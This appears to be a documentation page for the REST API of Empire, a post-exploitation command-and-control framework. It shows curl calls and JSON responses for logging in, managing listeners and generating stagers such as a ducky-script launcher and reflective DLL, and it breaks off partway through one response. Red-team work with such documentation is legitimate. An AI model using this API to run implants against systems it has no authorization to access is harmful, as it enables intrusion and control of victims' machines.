<!DOCTYPE html>
  
  
  
  
   <html class="no-js"> 

  <head lang="en-us">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,maximum-scale=1">
    <meta http-equiv="X-UA-Compatible" content="IE=10" />
    <title>REST API - Empire Docs</title>
    <meta name="generator" content="Hugo 0.31.1" />

    
    <meta name="description" content="Building a cross platform Empire with PowerShell/Python.">
    
    <link rel="canonical" href="https://example.org/rest-api/">
    
    <meta name="author" content="EmpireProject">
    

    <meta property="og:url" content="https://example.org/rest-api/">
    <meta property="og:title" content="Empire Docs">
    <meta property="og:image" content="https://example.org/images/empire-logo.png">
    <meta name="apple-mobile-web-app-title" content="Empire Docs">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">

    <link rel="shortcut icon" type="image/x-icon" href="https://example.org/images/empire-logo.png">
    <link rel="icon" type="image/x-icon" href="https://example.org/images/empire-logo.png">

    <style>
      @font-face {
        font-family: 'Icon';
        src: url('https://example.org/fonts/icon.eot');
        src: url('https://example.org/fonts/icon.eot')
               format('embedded-opentype'),
             url('https://example.org/fonts/icon.woff')
               format('woff'),
             url('https://example.org/fonts/icon.ttf')
               format('truetype'),
             url('https://example.org/fonts/icon.svg')
               format('svg');
        font-weight: normal;
        font-style: normal;
      }
    </style>

    <link rel="stylesheet" href="https://example.org/stylesheets/application.css">
    <link rel="stylesheet" href="https://example.org/stylesheets/temporary.css">
    <link rel="stylesheet" href="https://example.org/stylesheets/palettes.css">
    <link rel="stylesheet" href="https://example.org/stylesheets/highlight/highlight.css">

    
    
    
    <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ubuntu:400,700|Ubuntu&#43;Mono">
    <style>
      body, input {
        font-family: 'Ubuntu', Helvetica, Arial, sans-serif;
      }
      pre, code {
        font-family: 'Ubuntu Mono', 'Courier New', 'Courier', monospace;
      }
    </style>

    
    <script src="https://example.org/javascripts/modernizr.js"></script>

    

  </head>
  <body class="palette-primary-blue palette-accent-blue">



	
	


<div class="backdrop">
	<div class="backdrop-paper"></div>
</div>

<input class="toggle" type="checkbox" id="toggle-drawer">
<input class="toggle" type="checkbox" id="toggle-search">
<label class="toggle-button overlay" for="toggle-drawer"></label>

<header class="header">
	<nav aria-label="Header">
  <div class="bar default">
    <div class="button button-menu" role="button" aria-label="Menu">
      <label class="toggle-button icon icon-menu" for="toggle-drawer">
        <span></span>
      </label>
    </div>
    <div class="stretch">
      <div class="title">
        REST API
      </div>
    </div>

    

    
    <div class="button button-github" role="button" aria-label="GitHub">
      <a href="https://github.com/empireproject" title="@empireproject on GitHub" target="_blank" class="toggle-button icon icon-github"></a>
    </div>
    
    
        
  </div>
  <div class="bar search">
    <div class="button button-close" role="button" aria-label="Close">
      <label class="toggle-button icon icon-back" for="toggle-search"></label>
    </div>
    <div class="stretch">
      <div class="field">
        <input class="query" type="text" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck>
      </div>
    </div>
    <div class="button button-reset" role="button" aria-label="Search">
      <button class="toggle-button icon icon-close" id="reset-search"></button>
    </div>
  </div>
</nav>
</header>

<main class="main">
	<div class="drawer">
		<nav aria-label="Navigation">
  <a href="https://github.com/EmpireProject/Empire" class="project">
    <div class="banner">
      
        <div class="logo">
          <img src="https://example.org/images/empire-logo.png">
        </div>
      
      <div class="name">
        <strong>Empire Docs <span class="version">2.3</span></strong>
        
          <br>
          EmpireProject/Empire
        
      </div>
    </div>
  </a>

  <div class="scrollable">
    <div class="wrapper">
      
        <ul class="repo">
          <li class="repo-download">
            <a href="https://github.com/EmpireProject/Empire/archive/master.zip" target="_blank" title="Download" data-action="download">
              <i class="icon icon-download"></i> Download
            </a>
          </li>
          <li class="repo-stars">
            <a href="https://github.com/EmpireProject/Empire/stargazers" target="_blank" title="Stargazers" data-action="star">
              <i class="icon icon-star"></i> Stars
              <span class="count">&ndash;</span>
            </a>
          </li>
        </ul>
        <hr>
      

      <div class="toc">
        
        <ul>
          




<li>
  
    



<a  title="Introduction" href="https://example.org/">
	
	Introduction
</a>



  
</li>



<li>
  
    



<a  title="Getting started" href="https://example.org/getting-started/">
	
	Getting started
</a>



  
</li>



<li>
  
    



<a  title="Overview" href="https://example.org/overview/">
	
	Overview
</a>



  
</li>



<li>
  
    



<a  title="Empire Core" href="https://example.org/empire-core/">
	
	Empire Core
</a>



  
</li>



<li>
  
    



<a  title="OSX Modules" href="https://example.org/osx-modules/">
	
	OSX Modules
</a>



  
</li>



<li>
  
    



<a  title="Linux Modules" href="https://example.org/linux-modules/">
	
	Linux Modules
</a>



  
</li>



<li>
  
    



<a  title="PowerShell Modules" href="https://example.org/powershell-modules/">
	
	PowerShell Modules
</a>



  
</li>



<li>
  
    



<a class="current" title="REST API" href="https://example.org/rest-api/">
	
	REST API
</a>


<ul id="scrollspy">
</ul>


  
</li>



<li>
  
    



<a  title="Roadmap" href="https://example.org/roadmap/">
	
	Roadmap
</a>



  
</li>



<li>
  
    



<a  title="License" href="https://example.org/license/">
	
	License
</a>



  
</li>


        </ul>
        

        
        <hr>
        <span class="section">The author</span>
        
        <ul>
          

          
          <li>
            <a href="https://github.com/empireproject" target="_blank" title="@empireproject on GitHub">
              @empireproject on GitHub
            </a>
          </li>
          

          
        </ul>
        
      </div>
    </div>
  </div>
</nav>

	</div>

	<article class="article">
		<div class="wrapper">
			<h1>REST API </h1>

			

<p>Empire 1.5.0 introduced a RESTful API that allows for scripting and control of Empire through HTTP JSON requests.</p>

<p>This API and documentation are based on the excellent example set by the <a href="https://github.com/beefproject/beef/wiki/BeEF-RESTful-API">BeEF Project</a>. All credit to <a href="https://github.com/antisnatchor">@antisnatchor</a> and the entire BeEF community for the great examples to draw on.</p>

<ul>
<li><a href="#introduction">Introduction</a></li>
<li><a href="#api-authentication">API Authentication</a></li>
<li><a href="#version-information">Version Information</a></li>
<li><a href="#configuration-information">Configuration Information</a></li>
<li><a href="#admin-functionality">Admin Functionality</a></li>
<li><a href="#listeners">Listeners</a></li>
<li><a href="#stagers">Stagers</a></li>
<li><a href="#agents">Agents</a></li>
<li><a href="#modules">Modules</a></li>
<li><a href="#credentials">Credentials</a></li>
<li><a href="#reporting">Reporting</a></li>
</ul>

<h2 id="introduction">Introduction</h2>

<p>There are currently two ways to launch the Empire RESTful API.</p>

<p>You can start a normal Empire instance with <code>./empire</code>, and then in another windows run <code>./empire --rest</code>. This starts the API without a fully-featured Empire instance, allowing you to still interact with the normal Empire UI.</p>

<p>Alternatively, you can run Empire &lsquo;headless&rsquo; with <code>./empire --headless</code>, which will start a complete Empire instance as well as the RESTful API, and will suppress all output except for startup messages.</p>

<p>By default, the RESTful API is started on port 1337, over HTTPS using the certificate located at ./data/empire.pem (which can be generated with ./setup/cert.sh). This port can be changed by supplying <code>--restport &lt;PORT_NUM&gt;</code> on launch.</p>

<p>The default username for the API is &lsquo;empireadmin&rsquo; and the default password is randomly generated by ./setup/setup_database.py during install. This value is retrievable by using <code>sqlitebrowser ./data/empire.db</code>, or can be modified in the setup_database.py file. You can also manually specify the username and password for a REST/headless launch with <code>--username admin --password 'Password123!'</code>.</p>

<p>You can review all cli options by running:</p>

<pre><code class="language-bash"># ./empire -h
usage: empire [-h] [--debug [DEBUG]] [-s [STAGER]]
              [-o [STAGER_OPTIONS [STAGER_OPTIONS ...]]] [-l [LISTENER]] [-v]
              [--rest] [--restport [RESTPORT]] [--headless]
              [--username [USERNAME]] [--password [PASSWORD]]

optional arguments:
  -h, --help            show this help message and exit
  --debug [DEBUG]       Debug level for output (default of 1).
  -s [STAGER], --stager [STAGER]
                        Specify a stager to generate. Lists all stagers if
                        none is specified.
  -o [STAGER_OPTIONS [STAGER_OPTIONS ...]], --stager-options [STAGER_OPTIONS [STAGER_OPTIONS ...]]
                        Supply options to set for a stager in OPTION=VALUE
                        format. Lists options if nothing is specified.
  -l [LISTENER], --listener [LISTENER]
                        Display listener options. Displays all listeners if
                        nothing is specified.
  -v, --version         Display current Empire version.
  --rest                Run the Empire RESTful API.
  --restport [RESTPORT]
                        Port to run the Empire RESTful API on.
  --headless            Run Empire and the RESTful API headless without the
                        usual interface.
  --username [USERNAME]
                        Start the RESTful API with the specified username
                        instead of pulling from empire.db
  --password [PASSWORD]
                        Start the RESTful API with the specified password
                        instead of pulling from empire.db
</code></pre>

<h2 id="api-authentication">API Authentication</h2>

<p>The Empire API uses a simple token-based auth system similar to <a href="https://github.com/beefproject/beef/wiki/BeEF-RESTful-API#authentication">BeEF&rsquo;s</a>. In order to make any requests to the API, a <strong>?token=X</strong> parameter must be supplied, otherwise a 403 error is returned.</p>

<p>The token is randomly generated on rest API start up and displayed on the command line:</p>

<pre><code class="language-bash"># ./empire --rest --password 'Password123!'

[*] Loading modules from: /mnt/hgfs/git/github/Empire/lib/modules/
 * Starting Empire RESTful API on port: 1337
 * RESTful API token: ks23jlvdki4fj1j23w39h0h0xcuwjrqilocxd6b5
 * Running on https://0.0.0.0:1337/ (Press CTRL+C to quit)
</code></pre>

<p>To retrieve the session token through the login interface, you can POST a request to <code>/api/admin/login</code>. Here&rsquo;s an example with curl:</p>

<pre><code class="language-bash"># curl --insecure -i -H &quot;Content-Type: application/json&quot; https://localhost:1337/api/admin/login -X POST -d '{&quot;username&quot;:&quot;empireadmin&quot;, &quot;password&quot;:&quot;Password123!&quot;}'
HTTP/1.0 200 OK
Content-Type: application/json
Content-Length: 57
Server: Werkzeug/0.11.4
Date: Thu, 31 Mar 2016 23:38:59 GMT

{
  &quot;token&quot;: &quot;ks23jlvdki4fj1j23w39h0h0xcuwjrqilocxd6b5&quot;
}
</code></pre>

<h2 id="version-information">Version Information</h2>

<h3 id="handler">Handler</h3>

<ul>
<li><strong>Handler</strong> : GET /api/version</li>
<li>Description : Returns the current Empire version.</li>
<li>No parameters</li>
</ul>

<h3 id="example">Example</h3>

<p><strong>Request</strong>:</p>

<pre><code class="language-bash">curl --insecure -i https://localhost:1337/api/version?token=ks23jlvdki4fj1j23w39h0h0xcuwjrqilocxd6b5
</code></pre>

<p><strong>Response</strong>:</p>

<pre><code class="language-json">{
  &quot;version&quot;: &quot;1.5.0&quot;
}
</code></pre>

<h2 id="configuration-information">Configuration Information</h2>

<h3 id="handler-1">Handler</h3>

<ul>
<li><strong>Handler</strong> : GET /api/config</li>
<li>Description : Returns the current Empire configuration.</li>
<li>No parameters</li>
</ul>

<h3 id="example-1">Example</h3>

<p><strong>Request</strong>:</p>

<pre><code class="language-bash">curl --insecure -i https://localhost:1337/api/config?token=ks23jlvdki4fj1j23w39h0h0xcuwjrqilocxd6b5
</code></pre>

<p><strong>Response</strong>:</p>

<pre><code class="language-json">{
  &quot;config&quot;: [
    {
      &quot;api_password&quot;: &quot;C3&gt;Jl...&quot;,
      &quot;api_username&quot;: &quot;empireadmin&quot;,
      &quot;autorun_command&quot;: &quot;&quot;,
      &quot;autorun_data&quot;: &quot;&quot;,
      &quot;current_api_token&quot;: &quot;ks23jlvdki4fj1j23w39h0h0xcuwjrqilocxd6b5&quot;,
      &quot;default_cert_path&quot;: &quot;&quot;,
      &quot;default_delay&quot;: 5,
      &quot;default_jitter&quot;: 0.0,
      &quot;default_lost_limit&quot;: 60,
      &quot;default_port&quot;: &quot;8080&quot;,
      &quot;default_profile&quot;: &quot;/admin/get.php,/news.asp,/login/process.jsp|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko&quot;,
      &quot;install_path&quot;: &quot;/home/user/Empire/&quot;,
      &quot;ip_blacklist&quot;: &quot;&quot;,
      &quot;ip_whitelist&quot;: &quot;&quot;,
      &quot;permanent_api_token&quot;: &quot;gi5afo3umac6...&quot;,
      &quot;server_version&quot;: &quot;Microsoft-IIS/7.5&quot;,
      &quot;stage0_uri&quot;: &quot;index.asp&quot;,
      &quot;stage1_uri&quot;: &quot;index.jsp&quot;,
      &quot;stage2_uri&quot;: &quot;index.php&quot;,
      &quot;staging_key&quot;: &quot;m@T%L?VH...&quot;,
      &quot;version&quot;: &quot;1.5.0&quot;
    }
  ]
}
</code></pre>

<h2 id="admin-functionality">Admin Functionality</h2>

<ul>
<li><a href="#get-session-token">Get Session Token</a></li>
<li><a href="#get-permanent-session-token">Get Permanent Session Token</a></li>
<li><a href="#restart-the-restful-api-server">Restart the RESTful API Server</a></li>
<li><a href="#shutdown-the-restful-api-server">Shutdown the RESTful API Server</a></li>
</ul>

<h3 id="get-session-token">Get Session Token</h3>

<h4 id="handler-2">Handler</h4>

<ul>
<li><strong>Handler</strong> : GET /api/login</li>
<li>Description : Logs into the API and gets the current session token.</li>
<li>No parameters</li>
</ul>

<h4 id="example-2">Example</h4>

<p><strong>Request</strong>:</p>

<pre><code class="language-bash">curl --insecure -i -H &quot;Content-Type: application/json&quot; https://localhost:1337/api/admin/login -X POST -d '{&quot;username&quot;:&quot;empireadmin&quot;, &quot;password&quot;:&quot;Password123!&quot;}'
</code></pre>

<p><strong>Response</strong>:</p>

<pre><code class="language-json">{
  &quot;token&quot;: &quot;ks23jlvdki4fj1j23w39h0h0xcuwjrqilocxd6b5&quot;
}
</code></pre>

<h3 id="get-permanent-session-token">Get Permanent Session Token</h3>

<h4 id="handler-3">Handler</h4>

<ul>
<li><strong>Handler</strong> : GET /api/permanenttoken</li>
<li>Description : Gets the permanent session token, reusable without login. Doesn&rsquo;t change on API restart.</li>
<li>No parameters</li>
</ul>

<h4 id="example-3">Example</h4>

<p><strong>Request</strong>:</p>

<pre><code class="language-bash">curl --insecure -i https://localhost:1337/api/admin/permanenttoken?token=ks23jlvdki4fj1j23w39h0h0xcuwjrqilocxd6b5
</code></pre>

<p><strong>Response</strong>:</p>

<pre><code class="language-json">{
  &quot;token&quot;: &quot;gi5afo3umac6c0...&quot;
}
</code></pre>

<h3 id="restart-the-restful-api-server">Restart the RESTful API Server</h3>

<h4 id="handler-4">Handler</h4>

<ul>
<li><strong>Handler</strong> : GET /api/restart</li>
<li>Description : Restarts the RESTful API server.</li>
<li>No parameters</li>
</ul>

<h4 id="example-4">Example</h4>

<p><strong>Request</strong>:</p>

<pre><code class="language-bash">curl --insecure -i https://localhost:1337/api/admin/restart?token=ks23jlvdki4fj1j23w39h0h0xcuwjrqilocxd6b5
</code></pre>

<p><strong>Response</strong>:</p>

<pre><code class="language-json">{
  &quot;success&quot;: true
}
</code></pre>

<h3 id="shutdown-the-restful-api-server">Shutdown the RESTful API Server</h3>

<h4 id="handler-5">Handler</h4>

<ul>
<li><strong>Handler</strong> : GET /api/shutdown</li>
<li>Description : Shutdown the RESTful API server.</li>
<li>No parameters</li>
</ul>

<h4 id="example-5">Example</h4>

<p><strong>Request</strong>:</p>

<pre><code class="language-bash">curl --insecure -i https://localhost:1337/api/admin/shutdown?token=ks23jlvdki4fj1j23w39h0h0xcuwjrqilocxd6b5
</code></pre>

<p><strong>Response</strong>:</p>

<pre><code class="language-json">{
  &quot;success&quot;: true
}
</code></pre>

<h2 id="listeners">Listeners</h2>

<ul>
<li><a href="#get-current-listeners">Get Current Listeners</a></li>
<li><a href="#get-listener-by-name">Get Listener by Name</a></li>
<li><a href="#get-current-listener-options">Get Current Listener Options</a></li>
<li><a href="#create-a-listener">Create a Listener</a></li>
<li><a href="#kill-a-listener">Kill a Listener</a></li>
<li><a href="#kill-all-listeners">Kill All Listeners</a></li>
</ul>

<h3 id="get-current-listeners">Get Current Listeners</h3>

<h4 id="handler-6">Handler</h4>

<ul>
<li><strong>Handler</strong> : GET /api/listeners</li>
<li>Description : Returns all current Empire listeners.</li>
<li>No parameters</li>
</ul>

<h4 id="example-6">Example</h4>

<p><strong>Request</strong>:</p>

<pre><code class="language-bash">curl --insecure -i https://localhost:1337/api/listeners?token=ks23jlvdki4fj1j23w39h0h0xcuwjrqilocxd6b5
</code></pre>

<p><strong>Response</strong>:</p>

<pre><code class="language-json">{
  &quot;listeners&quot;: [
    {
      &quot;ID&quot;: 1,
      &quot;cert_path&quot;: &quot;&quot;,
      &quot;default_delay&quot;: 5,
      &quot;default_jitter&quot;: 0.0,
      &quot;default_lost_limit&quot;: 60,
      &quot;default_profile&quot;: &quot;/admin/get.php,/news.asp,/login/process.jsp|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko&quot;,
      &quot;host&quot;: &quot;http://192.168.52.172:8080&quot;,
      &quot;kill_date&quot;: &quot;&quot;,
      &quot;listener_type&quot;: &quot;native&quot;,
      &quot;name&quot;: &quot;test&quot;,
      &quot;port&quot;: 8080,
      &quot;redirect_target&quot;: &quot;&quot;,
      &quot;staging_key&quot;: &quot;m@T%L?V...&quot;,
      &quot;working_hours&quot;: &quot;&quot;
    }
  ]
}
</code></pre>

<h3 id="get-listener-by-name">Get Listener by Name</h3>

<h4 id="handler-7">Handler</h4>

<ul>
<li><strong>Handler</strong> : GET /api/listeners/LISTENER_NAME</li>
<li>Description : Returns the listener specifed by the name/id LISTENER_NAME.</li>
<li>No parameters</li>
</ul>

<h4 id="example-7">Example</h4>

<p><strong>Request</strong>:</p>

<pre><code class="language-bash">curl --insecure -i https://localhost:1337/api/listeners/test?token=ks23jlvdki4fj1j23w39h0h0xcuwjrqilocxd6b5
</code></pre>

<p><strong>Response</strong>:</p>

<pre><code class="language-json">{
  &quot;listeners&quot;: [
    {
      &quot;ID&quot;: 1,
      &quot;cert_path&quot;: &quot;&quot;,
      &quot;default_delay&quot;: 5,
      &quot;default_jitter&quot;: 0.0,
      &quot;default_lost_limit&quot;: 60,
      &quot;default_profile&quot;: &quot;/admin/get.php,/news.asp,/login/process.jsp|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko&quot;,
      &quot;host&quot;: &quot;http://192.168.52.172:8080&quot;,
      &quot;kill_date&quot;: &quot;&quot;,
      &quot;listener_type&quot;: &quot;native&quot;,
      &quot;name&quot;: &quot;test&quot;,
      &quot;port&quot;: 8080,
      &quot;redirect_target&quot;: &quot;&quot;,
      &quot;staging_key&quot;: &quot;m@T%L...&quot;,
      &quot;working_hours&quot;: &quot;&quot;
    }
  ]
}
</code></pre>

<h3 id="get-current-listener-options">Get Current Listener Options</h3>

<h4 id="handler-8">Handler</h4>

<ul>
<li><strong>Handler</strong> : GET /api/listeners/options/listener_type</li>
<li>Description : Returns the current listener options for the specified type.</li>
<li>No parameters</li>
</ul>

<h4 id="example-8">Example</h4>

<p><strong>Request</strong>:</p>

<pre><code class="language-bash">curl --insecure -i https://localhost:1337/api/listeners/options/http?token=ks23jlvdki4fj1j23w39h0h0xcuwjrqilocxd6b5
</code></pre>

<p><strong>Response</strong>:</p>

<pre><code class="language-json">{
  &quot;listeneroptions&quot;: [
    {
      &quot;CertPath&quot;: {
        &quot;Description&quot;: &quot;Certificate path for https listeners.&quot;,
        &quot;Required&quot;: false,
        &quot;Value&quot;: &quot;&quot;
      },
      &quot;DefaultDelay&quot;: {
        &quot;Description&quot;: &quot;Agent delay/reach back interval (in seconds).&quot;,
        &quot;Required&quot;: true,
        &quot;Value&quot;: 5
      },
      &quot;DefaultJitter&quot;: {
        &quot;Description&quot;: &quot;Jitter in agent reachback interval (0.0-1.0).&quot;,
        &quot;Required&quot;: true,
        &quot;Value&quot;: 0.0
      },
      &quot;DefaultLostLimit&quot;: {
        &quot;Description&quot;: &quot;Number of missed checkins before exiting&quot;,
        &quot;Required&quot;: true,
        &quot;Value&quot;: 60
      },
      &quot;DefaultProfile&quot;: {
        &quot;Description&quot;: &quot;Default communication profile for the agent.&quot;,
        &quot;Required&quot;: true,
        &quot;Value&quot;: &quot;/admin/get.php,/news.asp,/login/process.jsp|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko&quot;
      },
      &quot;Host&quot;: {
        &quot;Description&quot;: &quot;Hostname/IP for staging.&quot;,
        &quot;Required&quot;: true,
        &quot;Value&quot;: &quot;http://192.168.52.173:8080&quot;
      },
      &quot;KillDate&quot;: {
        &quot;Description&quot;: &quot;Date for the listener to exit (MM/dd/yyyy).&quot;,
        &quot;Required&quot;: false,
        &quot;Value&quot;: &quot;&quot;
      },
      &quot;Name&quot;: {
        &quot;Description&quot;: &quot;Listener name.&quot;,
        &quot;Required&quot;: true,
        &quot;Value&quot;: &quot;test&quot;
      },
      &quot;Port&quot;: {
        &quot;Description&quot;: &quot;Port for the listener.&quot;,
        &quot;Required&quot;: true,
        &quot;Value&quot;: &quot;8080&quot;
      },
      &quot;RedirectTarget&quot;: {
        &quot;Description&quot;: &quot;Listener target to redirect to for pivot/hop.&quot;,
        &quot;Required&quot;: false,
        &quot;Value&quot;: &quot;&quot;
      },
      &quot;StagingKey&quot;: {
        &quot;Description&quot;: &quot;Staging key for initial agent negotiation.&quot;,
        &quot;Required&quot;: true,
        &quot;Value&quot;: &quot;m@T%L...&quot;
      },
      &quot;Type&quot;: {
        &quot;Description&quot;: &quot;Listener type (native, pivot, hop, foreign, meter).&quot;,
        &quot;Required&quot;: true,
        &quot;Value&quot;: &quot;native&quot;
      },
      &quot;WorkingHours&quot;: {
        &quot;Description&quot;: &quot;Hours for the agent to operate (09:00-17:00).&quot;,
        &quot;Required&quot;: false,
        &quot;Value&quot;: &quot;&quot;
      }
    }
  ]
}
</code></pre>

<h3 id="create-a-listener">Create a Listener</h3>

<h4 id="handler-9">Handler</h4>

<ul>
<li><strong>Handler</strong> : POST /api/listeners/listener_type</li>
<li>Description : Creates a listener with the specified parameters.</li>
<li>Parameters (none required) :

<ul>
<li>Name    : name for the listener</li>
<li><em>additional</em>    : any additional values enumerated from listener options above</li>
</ul></li>
</ul>

<h4 id="example-9">Example</h4>

<p><strong>Request</strong>:</p>

<pre><code class="language-bash">curl --insecure -i -H &quot;Content-Type: application/json&quot; https://localhost:1337/api/listeners/http?token=ks23jlvdki4fj1j23w39h0h0xcuwjrqilocxd6b5 -X POST -d '{&quot;Name&quot;:&quot;testing&quot;}'
</code></pre>

<p><strong>Response</strong>:</p>

<pre><code class="language-json">{
  &quot;msg&quot;: &quot;listener 'testing' successfully started.&quot;,
  &quot;success&quot;: true
}
</code></pre>

<h4 id="failure-example">Failure Example</h4>

<p><strong>Request</strong>:</p>

<pre><code class="language-bash">curl --insecure -i -H &quot;Content-Type: application/json&quot; https://localhost:1337/api/listeners/http?token=ks23jlvdki4fj1j23w39h0h0xcuwjrqilocxd6b5 -X POST -d '{&quot;Name&quot;:&quot;testing&quot;}'
</code></pre>

<p><strong>Response</strong>:</p>

<pre><code class="language-json">{
  &quot;msg&quot;: &quot;Error starting listener on port 8080, port likely already in use.&quot;,
  &quot;success&quot;: false
}
</code></pre>

<h3 id="kill-a-listener">Kill a Listener</h3>

<h4 id="handler-10">Handler</h4>

<ul>
<li><strong>Handler</strong> : DELETE /api/listeners/LISTENER_NAME</li>
<li>Description : Kills the listener specifed by the name/id LISTENER_NAME.</li>
<li>No parameters</li>
</ul>

<h4 id="example-10">Example</h4>

<p><strong>Request</strong>:</p>

<pre><code class="language-bash">curl --insecure -i https://localhost:1337/api/listeners/testing?token=ks23jlvdki4fj1j23w39h0h0xcuwjrqilocxd6b5 -X DELETE
</code></pre>

<p><strong>Response</strong>:</p>

<pre><code class="language-json">{
  &quot;success&quot;: true
}
</code></pre>

<h3 id="kill-all-listeners">Kill All Listeners</h3>

<h4 id="handler-11">Handler</h4>

<ul>
<li><strong>Handler</strong> : DELETE /api/listeners/all</li>
<li>Description : Kills all listeners.</li>
<li>No parameters</li>
</ul>

<h4 id="example-11">Example</h4>

<p><strong>Request</strong>:</p>

<pre><code class="language-bash">curl --insecure -i https://localhost:1337/api/listeners/all?token=ks23jlvdki4fj1j23w39h0h0xcuwjrqilocxd6b5 -X DELETE
</code></pre>

<p><strong>Response</strong>:</p>

<pre><code class="language-json">{
  &quot;success&quot;: true
}
</code></pre>

<h2 id="stagers">Stagers</h2>

<ul>
<li><a href="#get-current-stagers">Get Current Stagers</a></li>
<li><a href="#get-stager-by-name">Get Stager by Name</a></li>
<li><a href="#generate-stager">Generate Stager</a></li>
</ul>

<h3 id="get-current-stagers">Get Current Stagers</h3>

<h4 id="handler-12">Handler</h4>

<ul>
<li><strong>Handler</strong> : GET /api/stagers</li>
<li>Description : Returns all current Empire stagers and options.</li>
<li>No parameters</li>
</ul>

<h4 id="example-12">Example</h4>

<p><strong>Request</strong>:</p>

<pre><code class="language-bash">curl --insecure -i https://localhost:1337/api/stagers?token=ks23jlvdki4fj1j23w39h0h0xcuwjrqilocxd6b5
</code></pre>

<p><strong>Response</strong>:</p>

<pre><code class="language-json">{
  &quot;stagers&quot;: [
    {
      &quot;Author&quot;: [
        &quot;@harmj0y&quot;
      ],
      &quot;Comments&quot;: [
        &quot;&quot;
      ],
      &quot;Description&quot;: &quot;Generates a ducky script that runes a one-liner stage0 launcher for Empire.&quot;,
      &quot;Name&quot;: &quot;ducky&quot;,
      &quot;options&quot;: {
        &quot;Listener&quot;: {
          &quot;Description&quot;: &quot;Listener to generate stager for.&quot;,
          &quot;Required&quot;: true,
          &quot;Value&quot;: &quot;&quot;
        },
        &quot;OutFile&quot;: {
          &quot;Description&quot;: &quot;File to output duckyscript to.&quot;,
          &quot;Required&quot;: true,
          &quot;Value&quot;: &quot;&quot;
        },
        &quot;Proxy&quot;: {
          &quot;Description&quot;: &quot;Proxy to use for request (default, none, or other).&quot;,
          &quot;Required&quot;: false,
          &quot;Value&quot;: &quot;default&quot;
        },
        &quot;ProxyCreds&quot;: {
          &quot;Description&quot;: &quot;Proxy credentials ([domain\\]username:password) to use for request (default, none, or other).&quot;,
          &quot;Required&quot;: false,
          &quot;Value&quot;: &quot;default&quot;
        },
        &quot;StagerRetries&quot;: {
          &quot;Description&quot;: &quot;Times for the stager to retry connecting.&quot;,
          &quot;Required&quot;: false,
          &quot;Value&quot;: &quot;0&quot;
        },
        &quot;UserAgent&quot;: {
          &quot;Description&quot;: &quot;User-agent string to use for the staging request (default, none, or other).&quot;,
          &quot;Required&quot;: false,
          &quot;Value&quot;: &quot;default&quot;
        }
      }
    },
    ...
  ]
}
</code></pre>

<h3 id="get-stager-by-name">Get Stager by Name</h3>

<h4 id="handler-13">Handler</h4>

<ul>
<li><strong>Handler</strong> : GET /api/stagers/STAGER_NAME</li>
<li>Description : Returns the Empire stager specified by STAGER_NAME.</li>
<li>No parameters</li>
</ul>

<h4 id="example-13">Example</h4>

<p><strong>Request</strong>:</p>

<pre><code class="language-bash">curl --insecure -i https://localhost:1337/api/stagers/dll?token=ks23jlvdki4fj1j23w39h0h0xcuwjrqilocxd6b5
</code></pre>

<p><strong>Response</strong>:</p>

<pre><code class="language-json">{
  &quot;stagers&quot;: [
    {
      &quot;Author&quot;: [
        &quot;@sixdub&quot;
      ],
      &quot;Comments&quot;: [
        &quot;&quot;
      ],
      &quot;Description&quot;: &quot;Generate a PowerPick Reflective DLL to inject with stager code.&quot;,
      &quot;Name&quot;: &quot;dll&quot;,
      &quot;options&quot;: {
        &quot;Arch&quot;: {
          &quot;Description&quot;: &quot;Architecture of the .dll to generate (x64 or x86).&quot;,
          &quot;Required&quot;: true,
          &quot;Value&quot;: &quot;x64&quot;
        },
        &quot;Listener&quot;: {
          &quot;Description&quot;: &quot;Listener to use.&quot;,
          &quot;Required&quot;: true,
          &quot;Value&quot;: &quot;&quot;
        },
        &quot;OutFile&quot;: {
          &quot;Description&quot;: &quot;File to output dll to.&quot;,
          &quot;Required&quot;: true,
          &quot;Value&quot;: &quot;/tmp/launcher.dll&quot;
        },
        &quot;Proxy&quot;: {
          &quot;Description&quot;: &quot;Proxy to use for request (default, none, or other).&quot;,
          &quot;Required&quot;: false,
          &quot;Value&quot;: &quot;default&quot;
        },
        &quot;ProxyCreds&quot;: {
          &quot;Description&quot;: &quot;Proxy credentials ([domain\\]username:password) to use for request (default, none, or other).&quot;,
          &quot;Required&quot;: false,
          &quot;Value&quot;: &quot;default&quot;
        },
        &quot;StagerRetries&quot;: {
          &quot;Description&quot;: &quot;Times for the stager to retry connecting.&quot;,
          &quot;Required&quot;: false,
          &quot;Value&quot;: &quot;0&quot;
        },
        &quot;UserAgent&quot;: {
          &quot;Description&quot;: &quot;User-agent string to use for the staging request (default, none, or other).&quot;,
          &quot;Required&quot;: false,
          &quot;Value&quot;: &quot;default&quot;
        }
      }
    }
  ]
}
</code></pre>

<h3 id="generate-stager">Generate Stager</h3>

<h4 id="handler-14">Handler</h4>

<ul>
<li><strong>Handler</strong> : POST /api/stagers</li>
<li>Description : Returns the Empire stager specified by parameters.</li>
<li>Parameters :

<ul>
<li>StagerName  : the stager name to generate (required)</li>
<li>Listener    : the listener name to generate the stager for (required)</li>
<li><em>additional</em>    : any additional stager values enumerated from stager options</li>
</ul></li>
</ul>

<h4 id="example-14">Example</h4>

<p><strong>Request</strong>:</p>

<pre><code class="language-bash">curl --insecure -i -H &quot;Content-Type: application/json&quot; https://localhost:1337/api/stagers?token=ks23jlvdki4fj1j23w39h0h0xcuwjrqilocxd6b5 -X POST -d '{&quot;StagerName&quot;:&quot;launcher&quot;, &quot;Listener&quot;:&quot;testing&quot;}'
</code></pre>

<p><strong>Response</strong>:</p>

<pre><code class="language-json">{
  &quot;launcher&quot;: {
    &quot;Base64&quot;: {
      &quot;Description&quot;: &quot;Switch. Base64 encode the output.&quot;,
      &quot;Required&quot;: true,
      &quot;Value&quot;: &quot;True&quot;
    },
    &quot;Listener&quot;: {
      &quot;Description&quot;: &quot;Listener to generate stager for.&quot;,
      &quot;Required&quot;: true,
      &quot;Value&quot;: &quot;testing&quot;
    },
    &quot;OutFile&quot;: {
      &quot;Description&quot;: &quot;File to output launcher to, otherwise displayed on the screen.&quot;,
      &quot;Required&quot;: false,
